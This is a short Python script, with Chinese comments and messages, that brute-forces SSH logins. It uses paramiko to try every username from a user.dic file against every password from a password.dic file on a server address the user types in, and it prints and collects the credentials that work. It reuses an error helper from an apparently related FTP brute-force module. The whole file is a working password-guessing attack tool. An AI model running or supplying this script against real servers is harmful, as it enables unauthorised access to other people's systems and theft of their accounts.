from paramiko import SSHClient, AutoAddPolicy
from paramiko.ssh_exception import AuthenticationException, NoValidConnectionsError, SSHException
from ftp_brute_force import FtpBruteForce

if __name__ == '__main__':
    server_address, server_port = input("请输入服务器地址和端口号（用空格隔开）：").split()
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy)  # 允许连接不在know_hosts文件中的主机
    success_dict = dict()
    user_dict = r"user.dic"
    password_dict = r"password.dic"

    with open(user_dict, "r") as file1, open(password_dict, "r") as file2:
        for username in file1:
            username = username.strip()
            file2.seek(0, 0)
            for password in file2:
                password = password.strip()
                try:
                    ssh_client.connect(username=username, password=password, hostname=server_address,
                                       port=server_port,
                                       banner_timeout=1)
                except TimeoutError:
                    FtpBruteForce.error_message("连接超时或服务器不在线")
                except NoValidConnectionsError:
                    FtpBruteForce.error_message("服务器在线，但服务未运行")
                except AuthenticationException:
                    FtpBruteForce.error_message(f"{username} {password} 登录失败")
                except Exception:
                    pass
                else:
                    print(f"\033[32m{username} {password} 登录成功\033[0m")
                    success_dict[username] = password
                finally:
                    ssh_client.close()

    if len(success_dict) != 0:
        print("登录成功的用户：")
        for key, value in success_dict.items():
            print(f"\033[32m{key} {value}\033[0m")
    else:
        pass

    ssh_client.close()  # 关闭连接
